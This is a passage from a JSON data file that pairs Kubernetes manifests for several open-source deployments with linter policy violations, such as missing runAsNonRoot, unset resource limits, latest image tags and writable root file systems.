SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo:11800\n        - name: EUREKA_HOSTNAME\n          value: apm-eureka\n        - name: EUREKA_PORT\n          value: '8761'\n        ports:\n        - name: http\n          containerPort: 8082\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"apm-item\" is not set to runAsNonRoot"
  },
  {
    "id": "11713",
    "manifest_path": "data/manifests/the_stack_sample/sample_4521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-item\n  namespace: demo\n  labels:\n    app: apm-item\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-item\n  template:\n    metadata:\n      name: apm-item\n      labels:\n        app: apm-item\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-item\n        image: evanxuhe/apm-item:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-item\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo:11800\n        - name: EUREKA_HOSTNAME\n          value: apm-eureka\n        - name: EUREKA_PORT\n          value: '8761'\n        ports:\n        - name: http\n          containerPort: 8082\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sidecar\" is not set to runAsNonRoot"
  },
  {
    "id": "11714",
    "manifest_path": "data/manifests/the_stack_sample/sample_4521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-item\n  namespace: demo\n  labels:\n    app: apm-item\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-item\n  template:\n    metadata:\n      name: apm-item\n      labels:\n        app: apm-item\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-item\n        image: evanxuhe/apm-item:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-item\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo:11800\n        - name: EUREKA_HOSTNAME\n          value: apm-eureka\n        - name: EUREKA_PORT\n          value: '8761'\n        ports:\n        - name: http\n          containerPort: 8082\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"apm-item\" has cpu request 0"
  },
  {
    "id": "11715",
    "manifest_path": "data/manifests/the_stack_sample/sample_4521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-item\n  namespace: demo\n  labels:\n    app: apm-item\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-item\n  template:\n    metadata:\n      name: apm-item\n      labels:\n        app: apm-item\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-item\n        image: evanxuhe/apm-item:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-item\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo:11800\n        - name: EUREKA_HOSTNAME\n          value: apm-eureka\n        - name: EUREKA_PORT\n          value: '8761'\n        ports:\n        - name: http\n          containerPort: 8082\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sidecar\" has cpu request 0"
  },
  {
    "id": "11716",
    "manifest_path": "data/manifests/the_stack_sample/sample_4521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-item\n  namespace: demo\n  labels:\n    app: apm-item\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-item\n  template:\n    metadata:\n      name: apm-item\n      labels:\n        app: apm-item\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-item\n        image: evanxuhe/apm-item:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-item\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo:11800\n        - name: EUREKA_HOSTNAME\n          value: apm-eureka\n        - name: EUREKA_PORT\n          value: '8761'\n        ports:\n        - name: http\n          containerPort: 8082\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"apm-item\" has memory limit 0"
  },
  {
    "id": "11717",
    "manifest_path": "data/manifests/the_stack_sample/sample_4521.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: apm-item\n  namespace: demo\n  labels:\n    app: apm-item\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: apm-item\n  template:\n    metadata:\n      name: apm-item\n      labels:\n        app: apm-item\n    spec:\n      initContainers:\n      - name: sidecar\n        image: apache/skywalking-base:6.5.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - cp\n        - -r\n        - /skywalking/agent\n        - /sidecar\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      containers:\n      - name: apm-item\n        image: evanxuhe/apm-item:6.1.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: JAVA_OPTS\n          value: -javaagent:/sidecar/agent/skywalking-agent.jar\n        - name: SW_AGENT_NAME\n          value: apm-item\n        - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES\n          value: skywalk-1h6lqf-skywalking-skywalking-oap.demo:11800\n        - name: EUREKA_HOSTNAME\n          value: apm-eureka\n        - name: EUREKA_PORT\n          value: '8761'\n        ports:\n        - name: http\n          containerPort: 8082\n        volumeMounts:\n        - name: sidecar\n          mountPath: /sidecar\n      volumes:\n      - name: sidecar\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sidecar\" has memory limit 0"
  },
  {
    "id": "11718",
    "manifest_path": "data/manifests/the_stack_sample/sample_4523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-csi-app\nspec:\n  containers:\n  - name: my-frontend\n    image: busybox\n    command:\n    - sleep\n    - '100000'\n    volumeMounts:\n    - mountPath: /data\n      name: my-csi-volume\n  volumes:\n  - name: my-csi-volume\n    persistentVolumeClaim:\n      claimName: pmem-csi-pvc-late-binding\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"my-frontend\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11719",
    "manifest_path": "data/manifests/the_stack_sample/sample_4523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-csi-app\nspec:\n  containers:\n  - name: my-frontend\n    image: busybox\n    command:\n    - sleep\n    - '100000'\n    volumeMounts:\n    - mountPath: /data\n      name: my-csi-volume\n  volumes:\n  - name: my-csi-volume\n    persistentVolumeClaim:\n      claimName: pmem-csi-pvc-late-binding\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"my-frontend\" does not have a read-only root file system"
  },
  {
    "id": "11720",
    "manifest_path": "data/manifests/the_stack_sample/sample_4523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-csi-app\nspec:\n  containers:\n  - name: my-frontend\n    image: busybox\n    command:\n    - sleep\n    - '100000'\n    volumeMounts:\n    - mountPath: /data\n      name: my-csi-volume\n  volumes:\n  - name: my-csi-volume\n    persistentVolumeClaim:\n      claimName: pmem-csi-pvc-late-binding\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"my-frontend\" is not set to runAsNonRoot"
  },
  {
    "id": "11721",
    "manifest_path": "data/manifests/the_stack_sample/sample_4523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-csi-app\nspec:\n  containers:\n  - name: my-frontend\n    image: busybox\n    command:\n    - sleep\n    - '100000'\n    volumeMounts:\n    - mountPath: /data\n      name: my-csi-volume\n  volumes:\n  - name: my-csi-volume\n    persistentVolumeClaim:\n      claimName: pmem-csi-pvc-late-binding\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"my-frontend\" has cpu request 0"
  },
  {
    "id": "11722",
    "manifest_path": "data/manifests/the_stack_sample/sample_4523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-csi-app\nspec:\n  containers:\n  - name: my-frontend\n    image: busybox\n    command:\n    - sleep\n    - '100000'\n    volumeMounts:\n    - mountPath: /data\n      name: my-csi-volume\n  volumes:\n  - name: my-csi-volume\n    persistentVolumeClaim:\n      claimName: pmem-csi-pvc-late-binding\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"my-frontend\" has memory limit 0"
  },
  {
    "id": "11723",
    "manifest_path": "data/manifests/the_stack_sample/sample_4524.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20220111-c2df887350\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cherrypicker\" does not have a read-only root file system"
  },
  {
    "id": "11724",
    "manifest_path": "data/manifests/the_stack_sample/sample_4524.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20220111-c2df887350\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cherrypicker\" is not set to runAsNonRoot"
  },
  {
    "id": "11725",
    "manifest_path": "data/manifests/the_stack_sample/sample_4524.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20220111-c2df887350\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cherrypicker\" has cpu request 0"
  },
  {
    "id": "11726",
    "manifest_path": "data/manifests/the_stack_sample/sample_4524.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: cherrypicker\n  labels:\n    app: cherrypicker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: cherrypicker\n  template:\n    metadata:\n      labels:\n        app: cherrypicker\n    spec:\n      serviceAccountName: ''\n      serviceAccount: ''\n      containers:\n      - name: cherrypicker\n        image: gcr.io/k8s-prow/cherrypicker:v20220111-c2df887350\n        imagePullPolicy: Always\n        args:\n        - --github-token-path=/etc/github/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --dry-run=false\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: tmp\n          mountPath: /tmp\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: github-token\n        secret:\n          secretName: k8s-infra-cherrypick-robot-github-token\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cherrypicker\" has memory limit 0"
  },
  {
    "id": "11727",
    "manifest_path": "data/manifests/the_stack_sample/sample_4526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio-operator\n  namespace: minio-operator\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      name: minio-operator\n  template:\n    metadata:\n      labels:\n        name: minio-operator\n    spec:\n      serviceAccountName: minio-operator\n      containers:\n      - name: minio-operator\n        image: minio/operator:v4.4.13\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 200m\n            memory: 256Mi\n            ephemeral-storage: 500Mi\n        securityContext:\n          runAsUser: 1000\n          runAsGroup: 1000\n          runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - minio-operator\n            topologyKey: kubernetes.io/hostname\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"minio-operator\" does not have a read-only root file system"
  },
  {
    "id": "11728",
    "manifest_path": "data/manifests/the_stack_sample/sample_4526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio-operator\n  namespace: minio-operator\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      name: minio-operator\n  template:\n    metadata:\n      labels:\n        name: minio-operator\n    spec:\n      serviceAccountName: minio-operator\n      containers:\n      - name: minio-operator\n        image: minio/operator:v4.4.13\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 200m\n            memory: 256Mi\n            ephemeral-storage: 500Mi\n        securityContext:\n          runAsUser: 1000\n          runAsGroup: 1000\n          runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - minio-operator\n            topologyKey: kubernetes.io/hostname\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"minio-operator\" not found"
  },
  {
    "id": "11729",
    "manifest_path": "data/manifests/the_stack_sample/sample_4526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: minio-operator\n  namespace: minio-operator\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      name: minio-operator\n  template:\n    metadata:\n      labels:\n        name: minio-operator\n    spec:\n      serviceAccountName: minio-operator\n      containers:\n      - name: minio-operator\n        image: minio/operator:v4.4.13\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 200m\n            memory: 256Mi\n            ephemeral-storage: 500Mi\n        securityContext:\n          runAsUser: 1000\n          runAsGroup: 1000\n          runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - minio-operator\n            topologyKey: kubernetes.io/hostname\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"minio-operator\" has memory limit 0"
  },
  {
    "id": "11730",
    "manifest_path": "data/manifests/the_stack_sample/sample_4528.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tasksapp\n  labels:\n    app: tasksapp\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: tasksapp\n  template:\n    metadata:\n      labels:\n        app: tasksapp\n    spec:\n      containers:\n      - name: tasksapp\n        image: varunkumarg/tasksapp-python:1.0.0\n        ports:\n        - containerPort: 5000\n        imagePullPolicy: Always\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11731",
    "manifest_path": "data/manifests/the_stack_sample/sample_4528.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tasksapp\n  labels:\n    app: tasksapp\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: tasksapp\n  template:\n    metadata:\n      labels:\n        app: tasksapp\n    spec:\n      containers:\n      - name: tasksapp\n        image: varunkumarg/tasksapp-python:1.0.0\n        ports:\n        - containerPort: 5000\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tasksapp\" does not have a read-only root file system"
  },
  {
    "id": "11732",
    "manifest_path": "data/manifests/the_stack_sample/sample_4528.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tasksapp\n  labels:\n    app: tasksapp\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: tasksapp\n  template:\n    metadata:\n      labels:\n        app: tasksapp\n    spec:\n      containers:\n      - name: tasksapp\n        image: varunkumarg/tasksapp-python:1.0.0\n        ports:\n        - containerPort: 5000\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tasksapp\" is not set to runAsNonRoot"
  },
  {
    "id": "11733",
    "manifest_path": "data/manifests/the_stack_sample/sample_4528.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tasksapp\n  labels:\n    app: tasksapp\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: tasksapp\n  template:\n    metadata:\n      labels:\n        app: tasksapp\n    spec:\n      containers:\n      - name: tasksapp\n        image: varunkumarg/tasksapp-python:1.0.0\n        ports:\n        - containerPort: 5000\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tasksapp\" has cpu request 0"
  },
  {
    "id": "11734",
    "manifest_path": "data/manifests/the_stack_sample/sample_4528.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tasksapp\n  labels:\n    app: tasksapp\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: tasksapp\n  template:\n    metadata:\n      labels:\n        app: tasksapp\n    spec:\n      containers:\n      - name: tasksapp\n        image: varunkumarg/tasksapp-python:1.0.0\n        ports:\n        - containerPort: 5000\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tasksapp\" has memory limit 0"
  },
  {
    "id": "11735",
    "manifest_path": "data/manifests/the_stack_sample/sample_4530.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: simple\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: simple\n  template:\n    metadata:\n      name: simple\n      labels:\n        app: simple\n    spec:\n      containers:\n      - name: simple\n        image: yourdockerhubid/simple:latest\n        imagePullPolicy: Always\n        env:\n        - name: RETURN_VALUE\n          value: simple\n        ports:\n        - name: http-port\n          containerPort: 8080\n        resources:\n          requests:\n            cpu: 200m\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"simple\" is using an invalid container image, \"yourdockerhubid/simple:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11736",
    "manifest_path": "data/manifests/the_stack_sample/sample_4530.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: simple\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: simple\n  template:\n    metadata:\n      name: simple\n      labels:\n        app: simple\n    spec:\n      containers:\n      - name: simple\n        image: yourdockerhubid/simple:latest\n        imagePullPolicy: Always\n        env:\n        - name: RETURN_VALUE\n          value: simple\n        ports:\n        - name: http-port\n          containerPort: 8080\n        resources:\n          requests:\n            cpu: 200m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"simple\" does not have a read-only root file system"
  },
  {
    "id": "11737",
    "manifest_path": "data/manifests/the_stack_sample/sample_4530.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: simple\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: simple\n  template:\n    metadata:\n      name: simple\n      labels:\n        app: simple\n    spec:\n      containers:\n      - name: simple\n        image: yourdockerhubid/simple:latest\n        imagePullPolicy: Always\n        env:\n        - name: RETURN_VALUE\n          value: simple\n        ports:\n        - name: http-port\n          containerPort: 8080\n        resources:\n          requests:\n            cpu: 200m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"simple\" is not set to runAsNonRoot"
  },
  {
    "id": "11738",
    "manifest_path": "data/manifests/the_stack_sample/sample_4530.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: simple\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: simple\n  template:\n    metadata:\n      name: simple\n      labels:\n        app: simple\n    spec:\n      containers:\n      - name: simple\n        image: yourdockerhubid/simple:latest\n        imagePullPolicy: Always\n        env:\n        - name: RETURN_VALUE\n          value: simple\n        ports:\n        - name: http-port\n          containerPort: 8080\n        resources:\n          requests:\n            cpu: 200m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"simple\" has memory limit 0"
  },
  {
    "id": "11739",
    "manifest_path": "data/manifests/the_stack_sample/sample_4531.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-init-secure\n  labels:\n    app: cockroachdb\nspec:\n  template:\n    spec:\n      serviceAccountName: cockroachdb\n      initContainers:\n      - name: init-certs\n        image: cockroachdb/cockroach-k8s-request-cert:0.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/ash\n        - -ecx\n        - /request-cert -namespace=${POD_NAMESPACE} -certs-dir=/cockroach-certs -type=client\n          -user=root -symlink-ca-from=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n      containers:\n      - name: cluster-init\n        image: cockroachdb/cockroach:v20.1.3\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n        command:\n        - /cockroach/cockroach\n        - init\n        - --certs-dir=/cockroach-certs\n        - --host=cockroachdb-0.cockroachdb\n      volumes:\n      - name: client-certs\n        emptyDir: {}\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "11740",
    "manifest_path": "data/manifests/the_stack_sample/sample_4531.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-init-secure\n  labels:\n    app: cockroachdb\nspec:\n  template:\n    spec:\n      serviceAccountName: cockroachdb\n      initContainers:\n      - name: init-certs\n        image: cockroachdb/cockroach-k8s-request-cert:0.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/ash\n        - -ecx\n        - /request-cert -namespace=${POD_NAMESPACE} -certs-dir=/cockroach-certs -type=client\n          -user=root -symlink-ca-from=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n      containers:\n      - name: cluster-init\n        image: cockroachdb/cockroach:v20.1.3\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n        command:\n        - /cockroach/cockroach\n        - init\n        - --certs-dir=/cockroach-certs\n        - --host=cockroachdb-0.cockroachdb\n      volumes:\n      - name: client-certs\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cluster-init\" does not have a read-only root file system"
  },
  {
    "id": "11741",
    "manifest_path": "data/manifests/the_stack_sample/sample_4531.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-init-secure\n  labels:\n    app: cockroachdb\nspec:\n  template:\n    spec:\n      serviceAccountName: cockroachdb\n      initContainers:\n      - name: init-certs\n        image: cockroachdb/cockroach-k8s-request-cert:0.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/ash\n        - -ecx\n        - /request-cert -namespace=${POD_NAMESPACE} -certs-dir=/cockroach-certs -type=client\n          -user=root -symlink-ca-from=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n      containers:\n      - name: cluster-init\n        image: cockroachdb/cockroach:v20.1.3\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n        command:\n        - /cockroach/cockroach\n        - init\n        - --certs-dir=/cockroach-certs\n        - --host=cockroachdb-0.cockroachdb\n      volumes:\n      - name: client-certs\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-certs\" does not have a read-only root file system"
  },
  {
    "id": "11742",
    "manifest_path": "data/manifests/the_stack_sample/sample_4531.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: cluster-init-secure\n  labels:\n    app: cockroachdb\nspec:\n  template:\n    spec:\n      serviceAccountName: cockroachdb\n      initContainers:\n      - name: init-certs\n        image: cockroachdb/cockroach-k8s-request-cert:0.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/ash\n        - -ecx\n        - /request-cert -namespace=${POD_NAMESPACE} -certs-dir=/cockroach-certs -type=client\n          -user=root -symlink-ca-from=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n      containers:\n      - name: cluster-init\n        image: cockroachdb/cockroach:v20.1.3\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: client-certs\n          mountPath: /cockroach-certs\n        command:\n        - /cockroach/cockroach\n        - init\n        - --certs-dir=/cockroach-certs\n        - --host=cockroachdb-0.cockroachdb\n      volumes:\n      - name: client-certs\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
